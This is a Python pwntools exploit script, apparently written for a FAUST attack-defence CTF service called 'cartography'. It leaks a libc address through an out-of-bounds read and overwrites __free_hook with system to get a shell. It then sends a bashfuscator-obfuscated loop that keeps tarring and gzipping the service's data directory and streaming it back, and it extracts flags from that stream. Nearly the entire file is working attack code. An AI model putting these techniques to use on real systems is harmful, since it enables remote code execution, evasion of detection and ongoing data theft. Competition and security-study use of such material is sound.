#!/usr/bin/env python3
import gzip
import io

from pwn import *


def position(tube, offset):
    tube.recvuntil(b'5. Exit\n')
    tube.sendline(b'0')
    tube.recvuntil(b'Enter the sector\'s size:\n')
    tube.sendline(str(0x80000000 - 0x100 - (offset & ~0xfff) - 0x3000))  # stdbuf causes an extra mmap(0x3000)
    tube.recvuntil(b'Sector created!\n')


def read(tube, offset):
    tube.recvuntil(b'5. Exit\n')
    tube.sendline(b'2')
    tube.recvuntil(b'Where do you want to read?\n')
    tube.sendline(str(0x7ffffff0))
    tube.recvuntil(b'How much do you want to read?\n')
    howmuch = (offset & 0xfff) + 8
    tube.sendline(str(howmuch))
    return tube.recvn(howmuch)


def main():
    if len(sys.argv) == 1:
        if False:
            tube = remote('localhost', 25499)
        elif False:
            tube = gdb.debug(['/usr/bin/stdbuf', '-o0', 'srv/cartography/cartography'], gdbscript='''
b fwrite
c
''')
        else:
            tube = process(['/usr/bin/stdbuf', '-o0', 'srv/cartography/cartography'])
    else:
        tube = remote(sys.argv[1], 6666)

    leak_offset = 0x1b7830
    position(tube, leak_offset)
    leak = read(tube, leak_offset)
    libc, = struct.unpack('<Q', leak[-8:])
    libc -= 0x74000  # _IO_helper_jumps + 16 == __GI__IO_wdefault_finish
    print(f'libc=0x{libc:016x}')
    assert libc & 0xfff == 0

    write_offset = 0x1bd8e8
    position(tube, write_offset)
    leak2 = bytearray(read(tube, write_offset))
    leak2[-8:] = struct.pack('<Q', libc + 0x449c0)  # __free_hook = system
    tube.recvuntil(b'5. Exit\n')
    tube.sendline(b'1')
    tube.recvuntil(b'Where do you want to write?\n')
    tube.sendline(str(0x7ffffff0))
    tube.recvuntil(b'How much do you want to write?\n')
    tube.sendline(str(len(leak2)))
    tube.recvuntil(b'Enter your sensor data:\n')
    tube.send(bytes(leak2) + b'!')

    shell = b'/bin/bash\0'
    tube.recvuntil(b'5. Exit\n')
    tube.sendline(b'1')
    tube.recvuntil(b'Where do you want to write?\n')
    tube.sendline(str(0))
    tube.recvuntil(b'How much do you want to write?\n')
    tube.sendline(str(len(shell)))
    tube.recvuntil(b'Enter your sensor data:\n')
    tube.send(shell + b'!')

    tube.recvuntil(b'5. Exit\n')
    tube.sendline(b'0')
    tube.recvuntil(b'Enter the sector\'s size:\n')
    tube.send(str(1).rjust(32, '0'))

    subprocess.call([
        'bashfuscator',
        '--choose-mutators=token/special_char_only',
        '-c', 'echo -n Jithei0r; while true; do tar -c /srv/cartography/data 2>/dev/null | gzip -f -9; echo -n Jithei0r; sleep 30; done',
        '-o', 'payload',
    ])
    with open('payload') as fp:
        fp.readline()
        payload = fp.readline()
    tube.sendline(payload)

    tube.recvuntil('Jithei0r')
    while True:
        compressed = io.BytesIO(tube.recvuntil('Jithei0r')[:-8])
        uncompressed = gzip.GzipFile(mode='r', fileobj=compressed).read()
        print(set(re.compile(b'FAUST_[A-Za-z0-9/+]{32}').findall(uncompressed)))


if __name__ == '__main__':
    main()
